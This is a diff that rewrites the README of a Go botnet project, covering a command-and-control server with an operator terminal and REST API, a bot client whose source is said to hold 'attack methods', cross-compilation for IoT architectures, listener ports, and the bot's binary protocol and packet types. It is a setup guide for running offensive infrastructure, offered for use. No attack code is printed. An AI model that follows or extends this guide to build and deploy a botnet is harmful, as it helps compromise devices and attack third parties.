@@ -1,189 +1,155 @@
-# Go Botnet Project - Comprehensive Guide
+# Go Botnet Project - Setup Guide
 
-## 1. Project Overview
+## 1. Overview
 
-Welcome to the Go Botnet project. This document provides a comprehensive guide to understanding, setting up, and operating the Command and Control (C2) server and the associated bot clients. The system is designed for remote device management and monitoring, built entirely in Go for performance and cross-platform compatibility.
+This is a C2 (Command & Control) system with a bot client, written in Go. The C2 provides a terminal UI for managing bots, launching tasks, and monitoring connected devices. Communication is encrypted over TLS with a custom binary protocol.
 
-### Key Features
+### Structure
 
-*   **Command & Control (C2) Server:** A central server with a terminal-based UI for managing connected bots.
-*   **Cross-Platform Bot:** The bot client is designed to be compiled for multiple architectures (x86, ARM, MIPS), making it suitable for various IoT devices and servers.
-*   **Secure Communication:** All communication between the C2 and bots is encrypted using TLS.
-*   **Custom Binary Protocol:** A lightweight and efficient binary protocol for sending commands, heartbeats, and diagnostic data.
-*   **Device Diagnostics:** Bots can report system information like OS, architecture, CPU, memory, and uptime.
-*   **Extensible Utilities:** Includes Python scripts for converting media into a terminal-friendly format.
-
-### Repository Structure
-
-The project is organized into the following main directories:
-
-```plaintext
-/
-├── cnc/                # C2 Server Source Code and Data
-│   ├── main.go         # C2 server entry point
-│   ├── *.go            # Core C2 source files (networking, session management, etc.)
-│   └── data/           # C2 data files
-│       ├── certs/      # SSL/TLS certificates (server.crt, server.key)
-│       ├── geo/        # GeoIP database files for location mapping
-│       ├── gifs/       # Terminal-ready .tfx animation files
-│       ├── json/       # User and RBAC configuration (users.json, rbac.json)
-│       └── logs/       # System and user activity logs
+```
+├── cnc/                 # C2 server source
+│   ├── cfg.go           # constants (ports, paths, limits)
+│   ├── types.go         # shared types
+│   ├── main.go          # entry point, listeners, signal handling
+│   ├── tui.go           # terminal UI, commands, animations
+│   ├── auth.go          # login, bcrypt, quotas, connection limits
+│   ├── token.go         # JWT sessions, refresh, revocation
+│   ├── acl.go           # RBAC permissions
+│   ├── bots.go          # bot registry, heartbeat, diagnostics
+│   ├── wire.go          # binary packet protocol (19-byte header)
+│   ├── api.go           # REST API over HTTPS
+│   ├── pool.go          # TLS connection pool
+│   ├── store.go         # bounded thread-safe maps/slices
+│   ├── throttle.go      # rate limiting
+│   ├── log.go           # logging
+│   ├── check.go         # input validation
+│   └── data/
+│       ├── certs/       # server.crt, server.key
+│       ├── geo/         # GeoIP .mmdb files
+│       ├── gifs/        # .tfx animation files
+│       ├── json/        # rbac.json, users.json
+│       └── logs/        # runtime logs
 │
-├── device/             # Bot/Client Source Code
-│   ├── bot.go          # Main bot logic and communication protocol
-│   └── build.sh        # Build script for cross-compiling the bot
+├── device/              # bot client source
+│   ├── bot.go           # bot logic + attack methods
+│   └── build.sh         # cross-compile script
 │
-├── gifs/               # Original, source .gif files
-│
-└── gif.py              # Python utility to convert GIFs to .tfx format
+├── gifs/                # source .gif files
+├── gif.py               # GIF → TFX converter
+└── .gitignore
 ```
 
 ---
 
-## 2. The C2 (Command and Control) Server
-
-The C2 server is the brain of the operation, providing the interface to manage and task connected bots.
+## 2. C2 Server
 
 ### Prerequisites
 
-*   **Go:** Version 1.16 or newer installed and configured.
+- Go 1.21+
 
-### Configuration
+### Setup
 
-Before running the C2, ensure the following are correctly configured in the `cnc/data/` directory:
+1. Generate or place TLS certs in `cnc/data/certs/` (`server.crt`, `server.key`)
+2. Edit `cnc/data/json/users.json` to set up initial user accounts
+3. Edit `cnc/data/json/rbac.json` for role permissions
+4. Optionally place MaxMind `.mmdb` files in `cnc/data/geo/`
 
-*   **Users & Permissions:**
-    *   `json/users.json`: Defines user accounts, password hashes, and roles.
-    *   `json/rbac.json`: (Role-Based Access Control) Defines permissions for different user roles.
-*   **SSL/TLS Certificates:** The server requires `server.crt` and `server.key` in the `certs/` directory for secure TLS communication.
-*   **GeoIP Database:** Place MaxMind DB files (`.mmdb`) in the `geo/` directory to enable IP-to-location mapping for connected bots.
-*   **GIFs:** The C2 can display animated GIFs in the terminal. These must be converted to the `.tfx` format using the `gif.py` utility and placed in the `gifs/` directory.
-
-### Building the C2
-
-1.  **Navigate to the C2 directory:**
-    ```bash
-    cd cnc
-    ```
-
-2.  **Initialize Go modules and tidy dependencies** (if needed):
-    ```bash
-    go mod init C2
-    go mod tidy
-    ```
-
-3.  **Build the executable:**
-    This command compiles the source code and creates an executable file (e.g., `c2.exe` on Windows or `c2` on Linux).
-    ```bash
-    go build .
-    ```
-
-### Running the C2
-
-*   **Run the compiled executable:**
-    ```bash
-    # On Windows
-    .\c2.exe
-
-    # On Linux/macOS
-    ./c2
-    ```
-
-*   **Alternatively, build and run in one step:**
-    ```bash
-    go run .
-    ```
-
----
-
-## 3. The Bot/Device Client
-
-The bot is a lightweight client that runs on target devices, connects back to the C2, and awaits commands.
-
-### Prerequisites
-
-*   **Go:** Version 1.16 or newer installed for compilation.
-
-### Configuration
-
-> **⚠️ IMPORTANT: Hardcoded Values**
-> Before compiling the bot, you **must** edit `device/bot.go` to set the C2 server address and a unique Bot ID. These are currently hardcoded for simplicity.
->
-> ```go
-> // In device/bot.go, inside the main() function
-> func main() {
->     // 1. Change the Bot ID to a unique identifier for the device.
->     // 2. Change the IP address and port to match your C2 server.
-> 	bot := NewBot("UNIQUE_BOT_ID_HERE", "YOUR_C2_IP_ADDRESS:7002")
-> 	bot.Start()
-> }
-> ```
-
-### Building the Bot for Multiple Platforms
-
-The `device/build.sh` script is provided to cross-compile the bot for various common Linux architectures.
-
-1.  **Navigate to the device directory:**
-    ```bash
-    cd device
-    ```
-
-2.  **Make the build script executable** (on Linux/macOS):
-    ```bash
-    chmod +x build.sh
-    ```
-
-3.  **Run the build script:**
-    ```bash
-    ./build.sh
-    ```
-
-This will generate multiple binaries in the `device` directory, each named for its target architecture (e.g., `x86`, `armv7l`, `mips`). The script uses Go's cross-compilation features by setting `GOOS` and `GOARCH` environment variables.
-
----
-
-## 4. Communication Protocol
-
-The project uses a custom binary protocol for efficient and low-overhead communication.
-
-*   **Structure:** Packets consist of a fixed-size header and a variable-length payload.
-    *   **Header (19 bytes):** Contains Packet Type, Payload Length, Timestamp, and a Checksum.
-    *   **Payload:** Contains the actual data, such as a command or diagnostic info.
-*   **Packet Types:**
-    *   `Ping/Pong`: Used for checking connectivity.
-    *   `Command`: Sent from C2 to bot to execute tasks.
-    *   `Heartbeat`: Sent periodically by the bot to show it's online.
-    *   `Diagnostic`: Sent by the bot with system information.
-    *   `Auth`: The initial packet sent by a bot to authenticate with the C2.
-
----
-
-## 5. Utilities
-
-### `gif.py` - GIF to TFX Converter
-
-This Python script converts standard `.gif` files into a special `.tfx` format that can be rendered in a terminal, allowing the C2 to display animations.
-
-#### Prerequisites
-
-*   **Python 3**
-*   **Pillow Library:** `pip install Pillow`
-*   **NumPy Library:** `pip install numpy`
-
-#### Usage
-
-Run the script from the project's root directory.
+### Build & Run
 
 ```bash
-python gif.py <input_gif_path> <output_tfx_path>
+cd cnc
+go build -o c2 .
+./c2
 ```
 
-**Example:** To convert `crow.gif` for the C2:
+Or build and run in one step:
+
+```bash
+cd cnc
+go run .
+```
+
+The server starts three listeners:
+- **Port 420** — operator terminal (TLS)
+- **Port 7002** — bot connections (TLS)
+- **Port 8443** — REST API (HTTPS)
+
+---
+
+## 3. Bot Client
+
+### Setup
+
+Edit `device/bot.go` and change the C2 address in `main()`:
+
+```go
+func main() {
+    b := newBot(randID(16), "YOUR_C2_IP:7002")
+    b.run()
+}
+```
+
+### Build
+
+Single platform:
+
+```bash
+cd device
+go build -o bot .
+./bot
+```
+
+Cross-compile for multiple Linux targets:
+
+```bash
+cd device
+chmod +x build.sh
+./build.sh
+# outputs in build/ directory: x86, armv7l, armv5l, armv8l, mips, mipsel
+```
+
+---
+
+## 4. Protocol
+
+Custom binary protocol over TLS.
+
+- **Header:** 19 bytes (type `uint8`, length `uint32`, timestamp `int64`, padding, checksum `uint16`)
+- **Payload:** variable length, max 16 KB
+- **Checksum:** SHA-256 of header bytes + payload, truncated to 2 bytes
+
+Packet types:
+| Type | Value | Direction |
+|:---|:---|:---|
+| Ping | `0x01` | Both |
+| Pong | `0x02` | Both |
+| Command | `0x03` | C2 → Bot |
+| Diagnostic | `0x04` | Bot → C2 |
+| Heartbeat | `0x05` | Bot → C2 |
+| Auth | `0x06` | Bot → C2 |
+| AuthResp | `0x07` | C2 → Bot |
+
+---
+
+## 5. GIF → TFX Converter
+
+Converts GIF files to a terminal-renderable `.tfx` format using half-block characters.
+
+### Requirements
+
+```bash
+pip install Pillow numpy
+```
+
+### Usage
+
+```bash
+python gif.py <input.gif> <output.tfx> [--width 80] [--height 24]
+```
+
+Example:
+
 ```bash
 python gif.py gifs/crow.gif cnc/data/gifs/crow.tfx
-```
-
-You can also specify the terminal dimensions for the output:
-```bash
-python gif.py gifs/Love.gif cnc/data/gifs/love.tfx --width 80 --height 24
+python gif.py gifs/logo.gif cnc/data/gifs/logo.tfx --width 120 --height 30
 ```
